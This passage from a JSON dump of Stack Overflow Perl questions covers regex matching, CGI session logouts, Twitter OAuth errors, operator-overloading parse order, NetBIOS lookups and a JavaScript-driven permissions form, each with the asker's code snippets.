}\n</code></pre>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12312310,"title":"How to match Chinese characters in Perl?","body":"<p>How to match Chinese characters in Perl? Why</p>\n\n<pre><code>$ perl -e 'if ( \"ä¸­å½\" =~ /\\p{Han}/ ) { print \"!\"}'\n$\n</code></pre>\n\n<p>doesn't work?</p>\n"},{"tags":["perl","file-download"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":188,"score":0,"question_id":12311308,"title":"Perl check if file exists in url to be fetched","body":"<p>whilst performing file::fetch on a database of URLs, certain URLs contain only the top level domain such as <a href=\"http://google.com\" rel=\"nofollow\">http://google.com</a>.  How can i construct my if check such that it will verify that there is a file to fetched so when i create a new file::fetch object, it wouldnt throw me this error: </p>\n\n<p><code>Use of uninitialized value $path in pattern match (m//) at C:/Perl/lib/File/Spec/Unix.pm line 267.<br>\nUse of uninitialized value in string eq at C:/Perl/lib/File/Fetch.pm line 395.</code></p>\n\n<p>Here is a snippet of my code where i am trying to do some verification</p>\n\n<pre><code>my $uri_handle = File::Fetch-&gt;new(uri =&gt; $url);\nmy $getfile = $uri_handle -&gt;file;\nif ($getfile){\n    my $dir_handle = $uri_handle-&gt;fetch( to =&gt; $dir ) or die \"Couldn't fetch file: $uri_handle-&gt;error\\n\";\n    #print \"[ID:$myid] File fetch completed!\\n\\n\";\n}else{\n    print \"[ID:$myid] There is no file to be fetched from $url\\n\\n\";\n}   \n</code></pre>\n\n<p>But the file method fails too because it could not retrieve a file name at the URL.</p>\n\n<pre><code>Thread 1 terminated abnormally: Can't call method \"file\" on an undefined value at C:\\test\\multihashtest2.pl line 102.\n</code></pre>\n"},{"tags":["perl","twitter","oauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":156,"score":0,"question_id":11227738,"title":"Net::Twitter::Lite Could not authenticate with OAuth","body":"<p>I'm trying to get a reply for my tweet. I use Net::Twitter::Lite:</p>\n\n<pre><code>my $nt = Net::Twitter::Lite-&gt;new(%consumer_tokens, %access_tokens, legacy_lists_api=&gt;1);\nmy $mentions = $nt-&gt;mentions();\nprint Dumper $mentions;\n</code></pre>\n\n<p>But after that i have only one error: Could not authenticate with OAuth.\nAny ideas?</p>\n\n<p>I can post tweet like: \n<code>my $status = $nt-&gt;update({ status =&gt; 'some text' });</code>\nBut I can't get the reply.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Work:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse Net::Twitter::Lite;\nuse Data::Dumper;\n\nmy %consumer_tokens = (\nconsumer_key    =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxx',\nconsumer_secret =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',\n);\nmy %access_tokens=(\naccess_token =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',\naccess_token_secret =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',\n);\n\nmy $nt = Net::Twitter::Lite-&gt;new(%consumer_tokens, %access_tokens, legacy_lists_api=&gt;1);\n\n#217932132083970049\nmy $status = $nt-&gt;update({ status =&gt; 'Happy Perl People!' });\nprint Dumper $status;\n</code></pre>\n\n<p>Don't Work:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\nuse Net::Twitter::Lite;\nuse Data::Dumper;\n\nmy %consumer_tokens = (\nconsumer_key    =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxx',\nconsumer_secret =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',\n);\nmy %access_tokens=(\naccess_token =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',\naccess_token_secret =&gt; 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',\n);\n\nmy $nt = Net::Twitter::Lite-&gt;new(%consumer_tokens, %access_tokens, legacy_lists_api=&gt;1);\n\n#217932132083970049\nmy $mentions = $nt-&gt;mentions();\nprint Dumper $mentions;\n</code></pre>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":103,"score":1,"question_id":12304301,"title":"how to search and replace string in a file in perl","body":"<p>The content of my input file is shown below:</p>\n\n<pre><code>abc\\**def\\ghi**\\abc\\!!!!!\nabc\\**4nfiug\\frgrefd\\gtefe\\wf4fs**\\abc\\df3gwddw\nabc\\**eg4/refw**\\abc\\f3\n</code></pre>\n\n<p>I need to replace whatever string in between <code>abc \\ --------------\\abc</code> in my input file with <code>ABC\\CBA</code></p>\n\n<p>I have tried something like below to get the strings that need to be replaced.But I get stuck when I need to use the search and replace:  </p>\n\n<pre><code>my $string1 = qr/abc\\W+([^a]+)/;\nmy $string2 = map{/$string1/ =&gt; \" \"} @input_file; #the string that need to be replaced\nmy $string3 = 'ABC\\CBA'  #string i that i want it to replace to\n\ns/$string2/$string3/g\n</code></pre>\n\n<p>Can anyone help on this? Thanks in advance.</p>\n"},{"tags":["perl","datetime","cgi","formbuilder"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12310302,"title":"CGI::FormBuilder datetime field not working","body":"<p>I am using <a href=\"https://metacpan.org/module/CGI::FormBuilder\" rel=\"nofollow\">CGI::FormBuilder</a> for a webapp I'm developing and I can't seem to get the 'datetime' field to work. I set up my field like this:</p>\n\n<pre><code>$form-&gt;field(name=&gt;'start_time',type=&gt;'datetime');\n</code></pre>\n\n<p>But it gives me this error:</p>\n\n<pre><code>Fatal: No message string found for 'js_invalid_datetime' (keys: charset form_confirm_text\nform_grow_default form_invalid_checkbox form_invalid_default form_invalid_file\nform_invalid_hidden form_invalid_input form_invalid_password form_invalid_radio\nform_invalid_select form_invalid_text form_invalid_textarea form_other_default \nform_required_text form_reset_default form_select_default form_submit_default \njs_invalid_checkbox js_invalid_date js_invalid_datetime-local js_invalid_default \njs_invalid_email js_invalid_end js_invalid_file js_invalid_input js_invalid_multiple\njs_invalid_number js_invalid_password js_invalid_radio js_invalid_select js_invalid_start\njs_invalid_textarea js_invalid_time js_invalid_url js_noscript lang mail_confirm_subject \nmail_confirm_text mail_results_subject) at /Library/Perl/5.12/CGI/FormBuilder/Field.pm \nline 529\n</code></pre>\n\n<p>You can see the <a href=\"https://metacpan.org/release/CGI-FormBuilder\" rel=\"nofollow\">list</a> of what the module provides, and the <a href=\"https://metacpan.org/source/NWIGER/CGI-FormBuilder-3.08/lib/CGI/FormBuilder/Field/datetime.pm#L12\" rel=\"nofollow\">datetime.pm</a> is one of the things listed.</p>\n\n<p>The <a href=\"https://metacpan.org/source/NWIGER/CGI-FormBuilder-3.08/lib/CGI/FormBuilder/Field/date.pm#PCGI%3A%3AFormBuilder%3A%3AField%3A%3Adate\" rel=\"nofollow\">date</a> type works fine, but <a href=\"https://metacpan.org/source/NWIGER/CGI-FormBuilder-3.08/lib/CGI/FormBuilder/Field/datetime_local.pm#PCGI%3A%3AFormBuilder%3A%3AField%3A%3Adatetime_local\" rel=\"nofollow\">datetime_local</a> throws the same error as datetime. Can anyone see what I'm doing wrong here? Or if it's a bug in the module, can anyone suggest a useful work around? Thanks!</p>\n"},{"tags":["perl","parsing","operator-overloading"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":174,"score":6,"question_id":12293640,"title":"why does perl parse $x | $y | $z as $z | ($x | $y)?","body":"<p>(EDIT: The <code>pipe</code> function below should return a blessed object for overloading to work correctly. See the accepted answer.)</p>\n\n<p>I'm trying to use perl's <code>overload</code> capability to build up a simple parse tree.\nI don't need much - in fact, all I need is one operator that is left-associative.\nBut there seems to an inconsistency in the way perl parses <code>$x op $y</code> versus a longer\nchain like <code>$x op $y op $z op ...</code>.</p>\n\n<p>Here's what I have:</p>\n\n<pre><code>package foo;\n\nuse overload '|' =&gt; \\&amp;pipe,\n             \"**\" =&gt; \\&amp;pipe,\n             \"&gt;&gt;\" =&gt; \\&amp;pipe;\n\nsub pipe { [ $_[0], $_[1] ] }\n\npackage main;\n\nmy $x = bless [\"x\"], \"foo\";\nmy $y = bless [\"y\"], \"foo\";\nmy $z = bless [\"z\"], \"foo\";\nmy $w = bless [\"w\"], \"foo\";\n\n                               # how perl parses it:\nmy $p2 = $x | $y;              # Cons x y\nmy $p3 = $x | $y | $z;         # Cons z (Cons x y)\nmy $p4 = $x | $y | $z | $w;    # Cons w (Cons z (Cons x y))\nmy $p5 = $z | ($x | $y);       # same as p3???\n\nmy $s2 = $x ** $y;             # Cons x y\nmy $s3 = $x ** $y ** $z;       # Cons x (Cons y z)\nmy $s4 = $x ** $y ** $z ** $w; # Cons x (Cons y (Cons z w))\n\nsub d { Dumper(\\@_) }\n\nsay \"p2 = \".d($p2);\nsay \"p3 = \".d($p3);\nsay \"p4 = \".d($p4);\nsay \"p5 = \".d($p5);\n\nsay \"s2 = \".d($s2);\nsay \"s3 = \".d($s3);\nsay \"s4 = \".d($s4);\n</code></pre>\n\n<p>The output is something like:</p>\n\n<pre><code>p2 = [bless( ['x'], 'foo' ),bless( ['y'], 'foo' )]\np3 = [bless( ['z'], 'foo' ),[bless( ['x'], 'foo' ),bless( ['y'], 'foo' )]]\np4 = [bless( ['w'], 'foo' ),[bless( ['z'], 'foo' ),[bless( ['x'], 'foo' ),bless( ['y'], 'foo' )]]]\np5 = [bless( ['z'], 'foo' ),[bless( ['x'], 'foo' ),bless( ['y'], 'foo' )]]\n\ns2 = [bless( ['x'], 'foo' ),bless( ['y'], 'foo' )]\ns3 = [bless( ['x'], 'foo' ),[bless( ['y'], 'foo' ),bless( ['z'], 'foo' )]]\ns4 = [bless( ['x'], 'foo' ),[bless( ['y'], 'foo' ),[bless( ['z'], 'foo' ),bless( ['w'], 'foo' )]]]\n</code></pre>\n\n<p>Shouldn't <code>p2</code> have x and y reversed to be consistent with the other cases?\nNote that <code>p3</code> and <code>p5</code> produce the same output - so how I can tell them apart?</p>\n\n<p>I don't see the same problem with the right-associative operator <code>**</code>.</p>\n\n<p>Is there a work around for this?</p>\n"},{"tags":["html","regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":108,"score":2,"question_id":12308602,"title":"How to use perl to replace text between two specific lines","body":"<p>Hi I have a html called 1.html file like this </p>\n\n<pre><code>&lt;div class=\"t_l\"&gt;&lt;/div&gt;\n &lt;some&gt; \n   lines\n     of\n codes\n &lt;/some&gt;\n&lt;div class=\"t_r\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>I want to replace the content of that div to another one, which stored in the file called \"banner\". \nbanner file is</p>\n\n<pre><code>&lt;other&gt; \n   lines\n     of some\n codes\n&lt;/other&gt;\n</code></pre>\n\n<p>So what I want to get is:</p>\n\n<pre><code>&lt;div class=\"t_l\"&gt;&lt;/div&gt;\n &lt;other&gt; \n   lines\n     of some\n codes\n &lt;/other&gt;\n&lt;div class=\"t_r\"&gt;&lt;/div&gt;\n</code></pre>\n\n<p>What I come up with using perl is something like this:</p>\n\n<pre><code># Slurp file 1.html into a single string\nopen(FILE,\"1.html\") or die \"Can't open file: $!\";\nundef $/;\nmy $file = &lt;FILE&gt;;\nopen(BANNER,\"banner\") or die \"Can't open file: $!\";\nundef $/;\nmy $banner = &lt;BANNER&gt;;\nclose BANNER;\n\n# Set strings to find and insert\nmy $first_line = '&lt;div class=\"t_l\"&gt;&lt;/div&gt;';\nmy $second_line = '&lt;div class=\"t_r\"&gt;&lt;/div&gt;';\n\n$file =~ s/$first_line\\n.+?\\n$second_line#s/$first_line\\n$banner\\n$second_line/;\n\nclose FILE;\n\n# Write output to output.txt\nopen(OUTPUT,\"&gt;1new.html\") or die \"Can't open file: $!\";\nprint OUTPUT $file;\nclose OUTPUT;\n</code></pre>\n\n<p>The above code cannot work. Any suggestions?</p>\n"},{"tags":["perl","pdf"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":12307204,"title":"How to fix broken/'nonconformance to standards' PDFs","body":"<p>I am building a web application with Perl. Users send me an XML file with among other things references to a number of PDF documents. I use XSLT to transform the XML to XHTML, and then use PrinceXML to create a PDF document from the XHTML. This PDF reserves empty pages with headers and footers for the attachments that will be included.</p>\n\n<p>Once I have the PDF, I use the PDF::API2 Perl module to open the PDF documents referenced in the XML one by one, scale and rotate the pages if required, and then include them in the PDF document that I created.</p>\n\n<p>My problem is that many of the PDFs submitted by the users are broken in some way. I.e., they do not conform to Adobe's PDF specifications, and PDF::API2 does not know how to manipulate them. The PDF::API2 documentation suggests using pdftk to repair broken PDFs, but this often takes a long time and is in many cases not successful.</p>\n\n<p>What is the best way to repair such broken PDFs?</p>\n"},{"tags":["ruby","perl","ruby-koans"],"answer_count":7,"favorite_count":6,"up_vote_count":12,"down_vote_count":0,"view_count":830,"score":12,"question_id":2358385,"title":"Is there a Perl equivalent of the ruby koans project?","body":"<p>Is there a Perl equivalent to the <a href=\"http://github.com/edgecase/ruby_koans\" rel=\"nofollow\">ruby-koans</a> project?</p>\n\n<p>When I was starting to learn ruby a few months ago I stumbled across ruby-koans and it was a <em>huge</em> help for learning the basics of the language.</p>\n\n<p>I now need to poke at some Perl code, and while I've hacked together a few Perl scripts in the past I've never really learned the language, and every time I have to refer back to older scripts I wrote for even simple things.  I have a feeling that something like koans would make it much easier for me to learn and <em>retain</em> knowledge of Perl.  </p>\n\n<p>Does anything like that exist?</p>\n"},{"tags":["python","perl","netbios"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12307533,"title":"Python equivalent of Perl Net::NBName to get Windows username?","body":"<p>I'm trying to re-code some Perl script I have to Python (and extend it). With Perl, using the Net library, I can give a hostname and get the Windows username. Here is a snippet of Perl code:</p>\n\n<pre><code>my $NetBios = Net::NBName-&gt;new;\nmy $nbName = $NetBios-&gt;node_status($hostname);\nif ( $nbName ) {\n    if ( $nbName-&gt;as_string =~ /^(\\S+)\\s+/ ) {\n        ($user = $1) =~ tr/A-Z/a-z/;\n    }\n}\n</code></pre>\n\n<p>I'd like to do the same thing in Python, but I cannot seem to find the right library to do this. Is there an equivalent way?</p>\n\n<p>For the background, I get the hostname of the user that is connected to a terminal server port. From that, if the hostname has \"dhcp\" or \"vpn\" in it, I want to use NetBIOS and try to get the username for that system (likely a PC).</p>\n"},{"tags":["perl","apache2","cgi","mod-perl"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":140,"score":0,"question_id":8027494,"title":"Errors running Perl CGI scripts under PerlRun","body":"<p>I am trying to run a Perl CGI web application under mod_perl 2.0 using PerlRun.  After making  a few simply changes to the scripts everything seems to work.</p>\n\n<p>However, the Apache error_log is getting huge!  Fast.</p>\n\n<p>There are many, many errors per request but they are of two types:</p>\n\n<p>1)</p>\n\n<pre><code>Constant subroutine ModPerl::ROOT::ModPerl::PerlRun::var_www_html_myapp_main_2epl::RC_SERVICE_UNAVAILABLE redefined at /usr/lib/perl5/vendor_perl/5.8.8/i386-linux-thread-multi/ModPerl/Util.pm line 69.\n</code></pre>\n\n<p>2)</p>\n\n<pre><code>Prototype mismatch: sub ModPerl::ROOT::ModPerl::PerlRun::var_www_html_myapp_main_2epl::RC_SWITCHING_PROTOCOLS: none vs () at /var/www/html/myapp/main.pl line 1054\n</code></pre>\n\n<p>This is line 1054 of main.pl:</p>\n\n<pre><code>use LWP::Simple qw(!head);\n</code></pre>\n\n<p>How can I get rid of these two types of errors?</p>\n"},{"tags":["perl","unix","awk","nawk"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":1,"view_count":124,"score":3,"question_id":12300096,"title":"How to print lines from a file that have repeated more than six times","body":"<p>I have a file containing the data shown below. The first comma-delimited field may be repeated any number of times, and I want to print only the lines after the sixth repetition of any value of this field</p>\n\n<p>For example, there are eight fields with <code>1111111</code> as the first field, and I want to print only the seventh and eighth of these records</p>\n\n<p>Input file:</p>\n\n<pre><code>1111111,aaaaaaaa,14\n1111111,bbbbbbbb,14\n1111111,cccccccc,14\n1111111,dddddddd,14\n1111111,eeeeeeee,14\n1111111,ffffffff,14\n1111111,gggggggg,14\n1111111,hhhhhhhh,14\n2222222,aaaaaaaa,14\n2222222,bbbbbbbb,14\n2222222,cccccccc,14\n2222222,dddddddd,14\n2222222,eeeeeeee,14\n2222222,ffffffff,14\n2222222,gggggggg,14\n3333333,aaaaaaaa,14\n3333333,bbbbbbbb,14\n3333333,cccccccc,14\n3333333,dddddddd,14\n3333333,eeeeeeee,14\n3333333,ffffffff,14\n3333333,gggggggg,14\n3333333,hhhhhhhh,14\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>1111111,gggggggg,14\n1111111,hhhhhhhh,14\n2222222,gggggggg,14\n3333333,gggggggg,14\n3333333,hhhhhhhh,14\n</code></pre>\n\n<p>What I have tried is to transponse the 2nd and 3rd fields with respect to 1st, so that I can use <code>nawk</code> on the field of <code>$7</code> or <code>$8</code></p>\n\n<pre><code>#!/usr/bin/ksh awk -F\",\" '{ a[$1]; b[$1]=b[$1]\",\"$2 c[$1]=c[$1]\",\"$3} END{ for(i in a){ print i\",\"b[i]\",\"c[i]} } ' file &gt; output.txt\n</code></pre>\n"},{"tags":["perl","session","login","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12268160,"title":"CGI::Session Randomly Logging Users Out","body":"<p>Here is my authentication logic:</p>\n\n<pre><code>sub user_logon {\nmy ($dbh, $cgi, $cache, $logout) = @_;\n\n#use Log::Log4perl qw(:easy);\n#Log::Log4perl-&gt;easy_init($DEBUG);\n\nmy $session = new CGI::Session(\"driver:MySQL\", $cgi, {Handle=&gt;$dbh});\n\n$session-&gt;expires(\"+3h\");\nmy $auth = new CGI::Session::Auth::DBI({\n    CGI             =&gt; $cgi,\n    Session         =&gt; $session,\n    IPAuth          =&gt; 1,\n    DBHandle        =&gt; $dbh,\n    #Log             =&gt; 1,\n});\n\nif($logout) {\n    $auth-&gt;logout();\n}\nelse {\n    $auth-&gt;authenticate();\n\n    if($auth-&gt;loggedIn) {\n        my $user = Cherry::Schema::ResultSet::Employee::get_employee($dbh, $cache, { number =&gt; $auth-&gt;{userid} });\n\n        if (!$user-&gt;{active}) {\n            return { error =&gt; $user-&gt;{name} . ' is not an active employee.' };\n        }\n\n        $user-&gt;{cookie} = $auth-&gt;sessionCookie();\n        return $user;\n    }\n    elsif($cgi-&gt;param('action') eq 'logon') {\n        if($cgi-&gt;param('log_username') &amp;&amp; $cgi-&gt;param('log_username')) {\n            return { error =&gt; 'Your username and/or password did not match.' };\n        }\n        elsif(!$cgi-&gt;param('log_username') || !$cgi-&gt;param('log_username')) {\n            return { error =&gt; 'Please enter a username and a password.' };\n        }\n    }\n    else {\n        return { error =&gt; 'You are not logged in' };\n    }\n}\n}\n\nsub handle_authentication {\nmy ($dbh, $cache, $config, $params, $cgi) = @_;\n\nif(($cgi-&gt;param('auth') || '') eq 'super_user') { # for automation\n    return;\n}\n\nif(($params-&gt;{action} || '') eq 'log_off') {\n    user_logon($dbh, $cgi, $cache, 1); # 1 means log out\n    login_form($config, 'Successfully logged out', $params-&gt;{login_url}, $params-&gt;{title});\n}\n\nmy $user = user_logon($dbh, $cgi, $cache);\n\nif(exists $user-&gt;{error}) {\n    login_form($config, $user-&gt;{error}, $params-&gt;{login_url}, $params-&gt;{title});\n}\nelsif($user-&gt;{number}) {\n    return $user;\n}\n\n}\n</code></pre>\n\n<p>Then in my code, every time I print a header, it looks something like this:</p>\n\n<pre><code>my $user = Cherry::Authentication::handle_authentication(\n$dbh,\n$cache,\n\\%config,\n{\n    action      =&gt; $FORM{action},\n    username   =&gt; $FORM{log_username},\n    password    =&gt; $FORM{log_password},\n    auth        =&gt; $FORM{auth}\n},\n$cgi\n);\nprint header( \n    -type   =&gt; 'application/json',\n    -cookie =&gt; $user-&gt;{cookie}\n);\n</code></pre>\n\n<p>The problem is that this code seems to work very well about 80% of the time. The other 20%, users are getting kicked out (and not after being stale for 3 hours).</p>\n\n<p>Are there any obvious flaws in this code? Have I left any crucial code out? </p>\n\n<p>If you feel is there not enough information here to give a viable solution, do you have any general suggestions on what can be done to troubleshoot these types of issues?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12306328,"title":"Concatenating strings with spaces in Perl. Any built-ins?","body":"<p>In Perl I can concatenate multiple strings with spaces between them as follows:</p>\n\n<pre><code>my $long_string = $one_string . \" \" . $another_string . \" \" . $yet_another_string . \" \" . \n$and_another_string . \" \" $the_lastr_string\n</code></pre>\n\n<p>However, typing this is a bit cumbersome.</p>\n\n<p>Is there a built-in that can make this task easier?</p>\n\n<p>e.g. something like:</p>\n\n<pre><code>concatenate_with_spaces($one_string, $another_string, $yet_another_string, ...)\n</code></pre>\n"},{"tags":["perl","mojolicious"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12304692,"title":"How to replace Mojolicious sessions with a custom implementation?","body":"<p>By default Mojolicious sessions create a signed cookie for the session. \nI would like to override this behavior. I can extend Mojolicious::Sessions and override the load and store methods, but how do I use my class instead of the default Mojolicious::Sessions.</p>\n"},{"tags":["regex","perl","mainframe","jcl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":12303467,"title":"Why doesn't zero-width match regex work?","body":"<p>I wrote a Perl function to replace job name in JCL script. Zero-width match was used here. </p>\n\n<pre><code>sub modify_jcl_jobname ()\n{\n    my ($jcl, $old, $new) = @_;\n\n    $jcl =~ s/\n         # The name must begin in column 3.\n         ^(?&lt;=\\/\\/)     \n\n         # The first charater must be alphabetic or national.\n        ($old)\n\n         # The name must be followed by at leat on blank.\n         # Append JCL keyword JOB \n        (?=\\s+JOB)\n       /$new/xmig; # Multi-lines, ignore case.\n\n    return $jcl;\n}\n</code></pre>\n\n<p>But this function didn't work until I did a simple modification that just deleted the leading sign \"^\". </p>\n\n<pre><code>  #before  ^(?&lt;=\\/\\/) \n\n  #after    (?&lt;=\\/\\/) \n</code></pre>\n\n<p>So I'd like to make it clear that the cause of problem. Any reply would be appreciated. Thanks.</p>\n"},{"tags":["perl","url","module"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12304655,"title":"URI::URL Not Getting Parameter","body":"<pre><code># The url I'm on: https://development.cherrylanekeepsakes.com/cgi-bin/employees.cgi?action=edit_timeclock_dashboard&amp;id=80&amp;start_date=2012-09-01&amp;end_date=2012-09-16&amp;print_view=1\nuse URI::URL;\nuse Data::Dumper;\nmy $url = URI::URL-&gt;new( '' . $cgi-&gt;new-&gt;url(-path_info =&gt; 1, -query =&gt; 1) );\nwarn Dumper($url-&gt;params('print_view'));\n</code></pre>\n\n<p>GIves me nothing. What am I doing wrong? This seems like a pretty simple task.</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":77,"score":-5,"question_id":12303494,"title":"Imputing missing data in aligned sequences","body":"<p>I want a simple perl script that can help me impute missing nucleotides in aligned sequences: As an example, my old_file contains the following aligned sequences:</p>\n\n<pre><code>seq1\nATGTC\nseq2\nATGTC\nseq3\nATNNC\nseq4\nNNGTN\nseq5\nCTCTN\n</code></pre>\n\n<p>So I now want to infer all Ns in the file and get a new file with all the Ns inferred based on the majority nucleotide at a particular position.  My new_file should look like this:</p>\n\n<pre><code>seq1\nATGTC\nseq2\nATGTC\nseq3\nATGTC\nseq4\nATGTC\nseq5\nCTCTC\n</code></pre>\n\n<p>A script with usage: \"impute_missing_data.pl old_file new_file\" or any other approach will be helpful to me.\nThank you.</p>\n"},{"tags":["python","perl","reference","for-loop","scope"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":78,"score":3,"question_id":12303018,"title":"best way to update values of outer-scope variables from within a for-loop?","body":"<p>This question is related to my earlier question here: <a href=\"http://stackoverflow.com/questions/12286231/python-update-outer-passed-value-from-within-a-for-loop\">python update outer passed value from within a for loop</a>.</p>\n\n<p>Coming from a Perl background it has never been a problem to pass a variable by reference and update the value from within a child scope as in the for-loop example below:</p>\n\n<pre><code>#!/usr/bin/perl\nmy ($str1,$str2) = ('before','before');\nprint \"before - str1:'$str1', str2:'$str2'\\n\";\n\nforeach my $str($str1,$str2){$str = 'after'}\nprint \"after - str1:'$str1', str2:'$str2'\\n\";\n</code></pre>\n\n<p>I understand in Python this is not possible as variables are imported <em>by-value</em> rather than <em>by-reference</em>, the only solution I've found within Python so far which achieves exactly what I need is:</p>\n\n<pre><code>def changeValue(str):\n  return 'after'\n\nstr1 = 'before'\nstr2 = 'before'\nfor s in str1,str2: print s\n\nstr1 = changeValue(str1)\nstr2 = changeValue(str2)\nfor s in str1,str2: print s\n</code></pre>\n\n<p>Although not ideal this would be <em>OK</em> if I could <strong>make the function 'changeValue' calls from within a for-loop</strong> - rather than calling them individually as above - but then I am back to the original \"can't pass a variable by reference\" problem. </p>\n\n<p>I am sure that there must be a simple and less convoluted Pythonic way to achieve what I'm after?</p>\n"},{"tags":["javascript","sql-server","perl","windows-server-2008","perlscript"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12279498,"title":"Javascript not populating Perl Form on Dev Server","body":"<p>I am Still a newbie to Perl and have run into difficulties.</p>\n\n<p>I have a system here which needs users to be assigned permissions in order for them to run reports. </p>\n\n<p>The system is fully functional on the local test environment hosted on a machine, but once it was uploaded to the Windows Server 2008 for dev, it doesnt seem to populate the assigned reports form anymore.</p>\n\n<p>We use Javascript functions to populate the user dropdown lists and also to populate the available reports which works. When it comes to assigned reports nothing is populating anymore. The exact same code taken from the depository will work on the Local Environment with no problems.</p>\n\n<p>The assigned reports will only populate if we change the directory of the Perl Script to point towards the local machine environment, instead of to the Perl script thats on the server.</p>\n\n<p>This is it pointed towards the Server Directory:</p>\n\n<pre><code>function ReadUserPermission( iUserID )\n{\n    var xmlhttp = new ActiveXObject(\"Msxml2.XMLHTTP\");\n    var szURL;\n    var iPermNumber = 0;\n\n    szURL = \"/Scripts/Security/ReadPermissions.pl\";\n\n    xmlhttp.Open(\"POST\", szURL, false);\n    xmlhttp.Send( iUserID );\n    var bRetVal = PermissionTab.loadXML( xmlhttp.responseText );\n    var rt = xmlhttp.responseText;\n\n    RGCollection = PermissionTab.XMLDocument.selectNodes(\"//REPORTGROUP\");\n    for (var i=0; i&lt; RGCollection.length; i++)\n    {\n        RGXML = new ActiveXObject(\"Msxml2.DOMDocument\")\n        RGXML.loadXML( RGCollection.item(i).xml );\n\n        ReportCollection = RGXML.selectNodes( \"//REPORTGROUPNAME\" );\n        szReportGroupName = ReportCollection.item(0).text;\n\n        ReportCollection    = RGXML.selectNodes( \"//REPORTGROUPID\" );\n        iReportGroupID      = ReportCollection.item(0).text;\n\n        ReportCollection = RGXML.selectNodes( \"//REPORT\" );\n        for( var j=0; j &lt; ReportCollection.length; j++ )\n        {\n            IR = new ActiveXObject( \"MSXML2.DOMDocument\" );\n            IR.loadXML( ReportCollection.item(j).xml );\n            IRD = IR.selectNodes( \"//REPORTNAME\" );      szReportName    = IRD.item(0).text;\n            IRD = IR.selectNodes( \"//REPORTID\" );        iReportID       = IRD.item(0).text;\n            IRD = IR.selectNodes( \"//PERMISSION\" ); bPermission     = IRD.item(0).text;            \n\n            Users[iUserID].Permissions[iPermNumber]                   = new DataClass;\n            Users[iUserID].Permissions[iPermNumber].ReportGroupName   = szReportGroupName;\n            Users[iUserID].Permissions[iPermNumber].ReportGroupID     = iReportGroupID;\n            Users[iUserID].Permissions[iPermNumber].ReportName        = szReportName;\n            Users[iUserID].Permissions[iPermNumber].ReportID          = iReportID;\n            Users[iUserID].Permissions[iPermNumber].Permission        = bPermission;\n            iPermNumber++;\n        }\n    }\n}\n</code></pre>\n\n<p>But when the szURL = \"//028-07743/Scripts/Security/ReadPermissions.pl\" it runs with no problems.</p>\n\n<p>Can anyone advise any help as this has baffled me.</p>\n\n<p>Here is the ReadPermissions.pl Script that we think is not running.</p>\n\n<pre><code>use CGI qw/:standard *table start_ul :cgi-lib/;\nuse Win32::ODBC;\nrequire \"ServerDetails.cfg\";\n\n#Reads Details for Connection from CFG file\nsub ReadCfg\n{\n    my $file = $_[0];\n\n    our $err;\n\n    {   # Put config data into a separate namespace\n        package CFG;\n\n        # Process the contents of the config file\n        my $rc = do($file);\n\n        # Check for errors\n        if ($@) {\n            $::err = \"ERROR: Failure compiling '$file' - $@\";\n        } elsif (! defined($rc)) {\n            $::err = \"ERROR: Failure reading '$file' - $!\";\n        } elsif (! $rc) {\n            $::err = \"ERROR: Failure processing '$file'\";\n        }\n    }\n\n    return ($err);\n}\n\n# Get our configuration information\nif (my $err = ReadCfg('ServerDetails.cfg')) {\n    print(STDERR $err, \"\\n\");\n    exit(1);\n}\n\n$szDataSource = \"DSN=$CFG::CFG{'server'}{'DSN'};UID=$CFG::CFG{'server'}{'UID'};PWD=$CFG::CFG{'server'}{'PWD'}\";\n\n%PARM = Vars;\n$iUser = $PARM{'keywords'};\n\nopen TMP, \"&gt;dhtml.txt\";\n$db = OpenConnection( $szDataSource );\n\n$szSQLStatement = \"EXEC 